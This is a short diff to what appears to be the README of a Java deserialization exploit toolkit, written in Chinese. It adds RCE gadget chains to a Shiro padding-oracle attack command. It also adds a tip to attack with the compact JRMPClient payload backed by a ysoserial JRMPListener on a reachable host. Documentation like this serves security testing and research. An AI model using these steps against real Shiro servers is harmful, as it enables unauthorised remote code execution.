@@ -36,7 +36,7 @@ java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.ShiroPaddingOracleC
 --attack
 具有user权限的url
 rememberMe的base64值
-gadget（URLDNS）
+gadget（URLDNS, CommonsCollections, CommonsBeanutils1, JRMPClient）
 gadget参数
 ```
 例：
@@ -48,6 +48,7 @@ CFf2rk+PFVG7IhV2S7F36DCqTnu2VgUFlJLniR3POUBrLlw+WIEy+REJuwDfkmQW99Z8Wsqi0J0/sjje
 URLDNS 
 http://baidu.com
 ```
+建议使用JRMPClient打，payload长度只有96字节,可以快速padding完成，不过需要使用ysoserial在可访问的ip起一个JRMPListener
 
 # Java Unmarshaller Security - Turning your data into code execution
 
